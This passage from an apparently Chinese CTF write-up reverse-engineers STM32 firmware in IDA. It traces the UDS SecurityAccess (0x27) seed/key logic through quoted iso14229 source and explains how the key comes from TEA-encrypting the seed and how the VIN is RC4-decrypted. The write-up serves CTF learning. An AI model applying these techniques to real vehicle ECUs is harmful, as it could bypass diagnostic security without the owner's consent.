call type转换参数类型</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/28.png" alt="28"></p><p>重命名为vin</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/29.png" alt="29"></p><h4 id="反编译bin格式"><a href="#反编译bin格式" class="headerlink" title="反编译bin格式"></a>反编译bin格式</h4><p>对于bin格式，参考该<a href="https://www.52pojie.cn/thread-1732800-1-1.html">文章</a>，ROM段、RAM段都要手动创建，还需要手动到程序入口点或<code>reset handler</code>切换至16位thumb。</p><p>hex.bin拖进32位ida，处理器选<code>arm Little-endian</code>打开，跳出memory映射结构设置界面，按下图设置，然后OK</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/30.png" alt="30"></p><p>打开后先看到ROM的首地址，对于STM32固件，这里存放了中断向量表(也可以设置到ram中)，CPU上电后就靠中断向量表来完成初始化工作，如图：</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/31.png" alt="31"></p><p>stm32手册中可以看到中断向量表中各个项的含义，这里只展示部分，第一项是复位后栈顶sp的初始值，第二项是reset handler，后面都是不同中断服务的函数地址，用于触发对应中断时查表跳转执行。</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/32.png" alt="32"></p><p>关于reset handler：CPU上电后先设置SP，再将PC设置为reset handler跳转执行。然后先执行SystemInit设置系统时钟，再调用__main函数，也就是上文从hex文件解析出来的程序入口点。</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/33.png" alt="33"></p><p>这里reset handler的值是0x80002AD(0x80002AC+1)，最后一位按照arm规范，是thumb指示位，1表示目标地址采用thumb16指令集。</p><p>所以我们按G跳转到<code>0x80002AC</code>，再按<code>Alt+G</code>，把段寄存器T的值设置为1，表示使用16位的thumb指令集，再按c就可以反编译了</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/34.png" alt="34"></p><p>反编译reset handler后大量函数也被自动分析出来了，但是并不全，有大量函数被遗漏了。我们大片选中ROM中的数据(图中箭头指的部分)直接按c全部反编译即可</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/35.png" alt="35"></p><h3 id="分析代码，获取VIN"><a href="#分析代码，获取VIN" class="headerlink" title="分析代码，获取VIN"></a>分析代码，获取VIN</h3><p>从CTF做题的角度看，思路是Findcrypt找到tea特征，查看交叉引用追溯到<code>sub_80043E8</code>函数，找到如下解密VIN的逻辑</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/36.png" alt="36"></p><p>但既然是复现，为了加深理解，我们对照<a href="https://github.com/driftregion/iso14229/tree/v0.7.1">源码</a>梳理程序的逻辑，以下是从源码提取出的相关代码</p><p>&#x2F;src&#x2F;server.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> <span class="hljs-title function_">EmitEvent</span><span class="hljs-params">(UDSServer_t *srv, UDSServerEvent_t evt, <span class="hljs-type">void</span> *data)</span> &#123;<br>    <span class="hljs-keyword">if</span> (srv-&gt;fn) &#123;<br>        <span class="hljs-keyword">return</span> srv-&gt;fn(srv, evt, data);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        UDS_DBG_PRINT(<span class="hljs-string">&quot;Unhandled UDSServerEvent %d, srv.fn not installed!\n&quot;</span>, evt);<br>        <span class="hljs-keyword">return</span> kGeneralReject;<br>    &#125;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">uint8_t</span> <span class="hljs-title function_">NegativeResponse</span><span class="hljs-params">(UDSReq_t *r, <span class="hljs-type">uint8_t</span> response_code)</span> &#123;<br>    r-&gt;send_buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0x7F</span>;<br>    r-&gt;send_buf[<span class="hljs-number">1</span>] = r-&gt;recv_buf[<span class="hljs-number">0</span>];<br>    r-&gt;send_buf[<span class="hljs-number">2</span>] = response_code;<br>    r-&gt;send_len = UDS_NEG_RESP_LEN;<br>    <span class="hljs-keyword">return</span> response_code;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> _0x27_SecurityAccess(UDSServer_t *srv, UDSReq_t *r) &#123;<br>    <span class="hljs-type">uint8_t</span> subFunction = r-&gt;recv_buf[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">uint8_t</span> response = kPositiveResponse;<br><br>    <span class="hljs-keyword">if</span> (UDSSecurityAccessLevelIsReserved(subFunction)) &#123;<br>        <span class="hljs-keyword">return</span> NegativeResponse(r, kIncorrectMessageLengthOrInvalidFormat);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!UDSTimeAfter(UDSMillis(), srv-&gt;sec_access_boot_delay_timer)) &#123;<br>        <span class="hljs-keyword">return</span> NegativeResponse(r, kRequiredTimeDelayNotExpired);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!(UDSTimeAfter(UDSMillis(), srv-&gt;sec_access_auth_fail_timer))) &#123;<br>        <span class="hljs-keyword">return</span> NegativeResponse(r, kExceedNumberOfAttempts);<br>    &#125;<br><br>    r-&gt;send_buf[<span class="hljs-number">0</span>] = UDS_RESPONSE_SID_OF(kSID_SECURITY_ACCESS);<br>    r-&gt;send_buf[<span class="hljs-number">1</span>] = subFunction;<br>    r-&gt;send_len = UDS_0X27_RESP_BASE_LEN;<br><br>    <span class="hljs-comment">// Even: sendKey</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == subFunction % <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-type">uint8_t</span> requestedLevel = subFunction - <span class="hljs-number">1</span>;<br>        UDSSecAccessValidateKeyArgs_t args = &#123;<br>            .level = requestedLevel,<br>            .key = &amp;r-&gt;recv_buf[UDS_0X27_REQ_BASE_LEN],<br>            .len = r-&gt;recv_len - UDS_0X27_REQ_BASE_LEN,<br>        &#125;;<br><br>        response = EmitEvent(srv, UDS_SRV_EVT_SecAccessValidateKey, &amp;args);<br><br>        <span class="hljs-keyword">if</span> (kPositiveResponse != response) &#123;<br>            srv-&gt;sec_access_auth_fail_timer =<br>                UDSMillis() + UDS_SERVER_0x27_BRUTE_FORCE_MITIGATION_AUTH_FAIL_DELAY_MS;<br>            <span class="hljs-keyword">return</span> NegativeResponse(r, response);<br>        &#125;<br><br>        <span class="hljs-comment">// &quot;requestSeed = 0x01&quot; identifies a fixed relationship between</span><br>        <span class="hljs-comment">// &quot;requestSeed = 0x01&quot; and &quot;sendKey = 0x02&quot;</span><br>        <span class="hljs-comment">// &quot;requestSeed = 0x03&quot; identifies a fixed relationship between</span><br>        <span class="hljs-comment">// &quot;requestSeed = 0x03&quot; and &quot;sendKey = 0x04&quot;</span><br>        srv-&gt;securityLevel = requestedLevel;<br>        r-&gt;send_len = UDS_0X27_RESP_BASE_LEN;<br>        <span class="hljs-keyword">return</span> kPositiveResponse;<br>    &#125;<br><br>    <span class="hljs-comment">// Odd: requestSeed</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* If a server supports security, but the requested security level is already unlocked when</span><br><span class="hljs-comment">        a SecurityAccess ‘requestSeed’ message is received, that server shall respond with a</span><br><span class="hljs-comment">        SecurityAccess ‘requestSeed’ positive response message service with a seed value equal to</span><br><span class="hljs-comment">        zero (0). The server shall never send an all zero seed for a given security level that is</span><br><span class="hljs-comment">        currently locked. The client shall use this method to determine if a server is locked for a</span><br><span class="hljs-comment">        particular security level by checking for a non-zero seed.</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-keyword">if</span> (subFunction == srv-&gt;securityLevel) &#123;<br>            <span class="hljs-comment">// Table 52 sends a response of length 2. Use a preprocessor define if this needs</span><br>            <span class="hljs-comment">// customizing by the user.</span><br>            <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> already_unlocked[] = &#123;<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>&#125;;<br>            <span class="hljs-keyword">return</span> safe_copy(srv, already_unlocked, <span class="hljs-keyword">sizeof</span>(already_unlocked));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            UDSSecAccessRequestSeedArgs_t args = &#123;<br>                .level = subFunction,<br>                .dataRecord = &amp;r-&gt;recv_buf[UDS_0X27_REQ_BASE_LEN],<br>                .len = r-&gt;recv_len - UDS_0X27_REQ_BASE_LEN,<br>                .copySeed = safe_copy,<br>            &#125;;<br><br>            response = EmitEvent(srv, UDS_SRV_EVT_SecAccessRequestSeed, &amp;args);<br><br>            <span class="hljs-keyword">if</span> (kPositiveResponse != response) &#123;<br>                <span class="hljs-keyword">return</span> NegativeResponse(r, response);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (r-&gt;send_len &lt;= UDS_0X27_RESP_BASE_LEN) &#123; <span class="hljs-comment">// no data was copied</span><br>                <span class="hljs-keyword">return</span> NegativeResponse(r, kGeneralProgrammingFailure);<br>            &#125;<br>            <span class="hljs-keyword">return</span> kPositiveResponse;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> NegativeResponse(r, kGeneralProgrammingFailure);<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x2F;src&#x2F;uds.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">UDSServerEvent</span> &#123;</span><br>    UDS_SRV_EVT_DiagSessCtrl,         <span class="hljs-comment">// UDSDiagSessCtrlArgs_t *</span><br>    UDS_SRV_EVT_EcuReset,             <span class="hljs-comment">// UDSECUResetArgs_t *</span><br>    UDS_SRV_EVT_ReadDataByIdent,      <span class="hljs-comment">// UDSRDBIArgs_t *</span><br>    UDS_SRV_EVT_ReadMemByAddr,        <span class="hljs-comment">// UDSReadMemByAddrArgs_t *</span><br>    UDS_SRV_EVT_CommCtrl,             <span class="hljs-comment">// UDSCommCtrlArgs_t *</span><br>    UDS_SRV_EVT_SecAccessRequestSeed, <span class="hljs-comment">// UDSSecAccessRequestSeedArgs_t *</span><br>    UDS_SRV_EVT_SecAccessValidateKey, <span class="hljs-comment">// UDSSecAccessValidateKeyArgs_t *</span><br>    UDS_SRV_EVT_WriteDataByIdent,     <span class="hljs-comment">// UDSWDBIArgs_t *</span><br>    UDS_SRV_EVT_RoutineCtrl,          <span class="hljs-comment">// UDSRoutineCtrlArgs_t*</span><br>    UDS_SRV_EVT_RequestDownload,      <span class="hljs-comment">// UDSRequestDownloadArgs_t*</span><br>    UDS_SRV_EVT_RequestUpload,        <span class="hljs-comment">// UDSRequestUploadArgs_t *</span><br>    UDS_SRV_EVT_TransferData,         <span class="hljs-comment">// UDSTransferDataArgs_t *</span><br>    UDS_SRV_EVT_RequestTransferExit,  <span class="hljs-comment">// UDSRequestTransferExitArgs_t *</span><br>    UDS_SRV_EVT_SessionTimeout,       <span class="hljs-comment">// NULL</span><br>    UDS_SRV_EVT_DoScheduledReset,     <span class="hljs-comment">// enum UDSEcuResetType *</span><br>    UDS_SRV_EVT_Err,                  <span class="hljs-comment">// UDSErr_t *</span><br>    UDS_EVT_IDLE,<br>    UDS_EVT_RESP_RECV,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">UDSSecurityAccessType</span> &#123;</span><br>    kRequestSeed = <span class="hljs-number">0x01</span>,<br>    kSendKey = <span class="hljs-number">0x02</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><p>&#x2F;src&#x2F;server.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">UDSServer</span> &#123;</span><br>    UDSTpHandle_t *tp;<br>    <span class="hljs-type">uint8_t</span> (*fn)(<span class="hljs-keyword">struct</span> UDSServer *srv, UDSServerEvent_t event, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *arg);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief \~chinese 服务器时间参数（毫秒） \~ Server time constants (milliseconds) \~</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">uint16_t</span> p2_ms;      <span class="hljs-comment">// Default P2_server_max timing supported by the server for</span><br>                         <span class="hljs-comment">// the activated diagnostic session.</span><br>    <span class="hljs-type">uint32_t</span> p2_star_ms; <span class="hljs-comment">// Enhanced (NRC 0x78) P2_server_max supported by the</span><br>                         <span class="hljs-comment">// server for the activated diagnostic session.</span><br>    <span class="hljs-type">uint16_t</span> s3_ms;      <span class="hljs-comment">// Session timeout</span><br><br>    <span class="hljs-type">uint8_t</span> ecuResetScheduled;            <span class="hljs-comment">// nonzero indicates that an ECUReset has been scheduled</span><br>    <span class="hljs-type">uint32_t</span> ecuResetTimer;               <span class="hljs-comment">// for delaying resetting until a response</span><br>                                          <span class="hljs-comment">// has been sent to the client</span><br>    <span class="hljs-type">uint32_t</span> p2_timer;                    <span class="hljs-comment">// for rate limiting server responses</span><br>    <span class="hljs-type">uint32_t</span> s3_session_timeout_timer;    <span class="hljs-comment">// indicates that diagnostic session has timed out</span><br>    <span class="hljs-type">uint32_t</span> sec_access_auth_fail_timer;  <span class="hljs-comment">// brute-force hardening: rate limit security access</span><br>                                          <span class="hljs-comment">// requests</span><br>    <span class="hljs-type">uint32_t</span> sec_access_boot_delay_timer; <span class="hljs-comment">// brute-force hardening: restrict security access until</span><br>                                          <span class="hljs-comment">// timer expires</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief UDS-1-2013: Table 407 - 0x36 TransferData Supported negative</span><br><span class="hljs-comment">     * response codes requires that the server keep track of whether the</span><br><span class="hljs-comment">     * transfer is active</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">bool</span> xferIsActive;<br>    <span class="hljs-comment">// UDS-1-2013: 14.4.2.3, Table 404: The blockSequenceCounter parameter</span><br>    <span class="hljs-comment">// value starts at 0x01</span><br>    <span class="hljs-type">uint8_t</span> xferBlockSequenceCounter;<br>    <span class="hljs-type">size_t</span> xferTotalBytes;  <span class="hljs-comment">// total transfer size in bytes requested by the client</span><br>    <span class="hljs-type">size_t</span> xferByteCounter; <span class="hljs-comment">// total number of bytes transferred</span><br>    <span class="hljs-type">size_t</span> xferBlockLength; <span class="hljs-comment">// block length (convenience for the TransferData API)</span><br><br>    <span class="hljs-type">uint8_t</span> sessionType;   <span class="hljs-comment">// diagnostic session type (0x10)</span><br>    <span class="hljs-type">uint8_t</span> securityLevel; <span class="hljs-comment">// SecurityAccess (0x27) level</span><br><br>    <span class="hljs-type">bool</span> RCRRP;             <span class="hljs-comment">// set to true when user fn returns 0x78 and false otherwise</span><br>    <span class="hljs-type">bool</span> requestInProgress; <span class="hljs-comment">// set to true when a request has been processed but the response has</span><br>                            <span class="hljs-comment">// not yet been sent</span><br><br>    <span class="hljs-comment">// UDS-1 2013 defines the following conditions under which the server does not</span><br>    <span class="hljs-comment">// process incoming requests:</span><br>    <span class="hljs-comment">// - not ready to receive (Table A.1 0x78)</span><br>    <span class="hljs-comment">// - not accepting request messages and not sending responses (9.3.1)</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// when this variable is set to true, incoming ISO-TP data will not be processed.</span><br>    <span class="hljs-type">bool</span> notReadyToReceive;<br><br>    UDSReq_t r;<br>&#125; UDSServer_t;<br></code></pre></td></tr></table></figure><p>&#x2F;test&#x2F;test_server_0x27_security_access.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint8_t</span> <span class="hljs-title function_">fn</span><span class="hljs-params">(UDSServer_t *srv, UDSServerEvent_t ev, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-keyword">switch</span> (ev) &#123;<br>    <span class="hljs-keyword">case</span> UDS_SRV_EVT_SecAccessRequestSeed: &#123;<br>        UDSSecAccessRequestSeedArgs_t *r = (UDSSecAccessRequestSeedArgs_t *)arg;<br>        <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> seed[] = &#123;<span class="hljs-number">0x36</span>, <span class="hljs-number">0x57</span>&#125;;<br>        TEST_INT_NE(r-&gt;level, srv-&gt;securityLevel);<br>        <span class="hljs-keyword">return</span> r-&gt;copySeed(srv, seed, <span class="hljs-keyword">sizeof</span>(seed));<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">case</span> UDS_SRV_EVT_SecAccessValidateKey: &#123;<br>        UDSSecAccessValidateKeyArgs_t *r = (UDSSecAccessValidateKeyArgs_t *)arg;<br>        <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> expected_key[] = &#123;<span class="hljs-number">0xC9</span>, <span class="hljs-number">0xA9</span>&#125;;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(r-&gt;key, expected_key, <span class="hljs-keyword">sizeof</span>(expected_key))) &#123;<br>            <span class="hljs-keyword">return</span> kSecurityAccessDenied;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> kPositiveResponse;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">default</span>:<br>        assert(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> kPositiveResponse;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用链如下，最后的fn函数就是上文通过FindCrypt找到的VIN加密逻辑所在函数，作者自定义了该函数，<code>uds.h</code>中可以看到case6对应case UDS_SRV_EVT_SecAccessRequestSeed</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_0x27_SecurityAccess -&gt; Odd: requestSeed -&gt; EmitEvent(srv, UDS_SRV_EVT_SecAccessRequestSeed, &amp;args); -&gt; <br>EmitEvent -&gt;  srv-&gt;fn(srv, evt, data) -&gt; <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">UDSServer</span> &#123;</span>... <span class="hljs-type">uint8_t</span> (*fn)(<span class="hljs-keyword">struct</span> UDSServer *srv, UDSServerEvent_t event, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *arg); ...&#125;<br>-&gt; <span class="hljs-type">uint8_t</span> <span class="hljs-title function_">fn</span><span class="hljs-params">(UDSServer_t *srv, UDSServerEvent_t ev, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *arg)</span>  <br></code></pre></td></tr></table></figure><p>同时，由于fn函数不是直接被调用，而是通过结构体传入_0x27_SecurityAccess进行调用，我们很难通过静态分析定位到加密逻辑所在的fn函数，如图</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/37.png" alt="37"></p><p>定位到fn的加密逻辑后就好办了，都是标准加密</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/38.png" alt="38"></p><p>先转换端序，再对(a1+3)进行标准tea解密，最后校验解密后的(a1+3)等于seed，那么tea加密seed就能得到(a1+3)</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/39.png" alt="39"></p><p>VIN在内存中是加密的状态，rc4函数以(a3+1)为key，采用标准rc4解密VIN</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/40.png" alt="40"></p><p>找到可疑数据</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/41.png" alt="41"></p><p>查看交叉引用发现在start函数的下一个函数(这里设置为main)中调用0x810004c处理0x8004EC8的数据生成了VIN密文</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/42.png" alt="42"></p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/43.png" alt="43"></p><p>直接复制密文生成函数，填入参数运行得到VIN密文<code>14 a6 91 fe b9 d7 41 af 82 cc 4e e9 47 47 28 4f d1</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 